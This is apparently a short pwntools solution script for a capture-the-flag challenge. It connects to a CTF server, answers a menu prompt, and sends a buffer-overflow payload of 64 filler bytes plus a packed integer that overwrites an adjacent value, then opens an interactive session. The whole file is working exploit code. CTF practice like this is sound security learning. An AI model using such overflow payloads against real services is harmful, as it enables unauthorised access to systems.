from pwn import *

r = remote('ctf.j0n9hyun.xyz', 3012)

payload = ''
payload += "A"*64
payload += p32(0xf4240)

r.sendlineafter("> ", "A")
r.sendlineafter("> ", payload)
print(r.recv())
r.interactive()
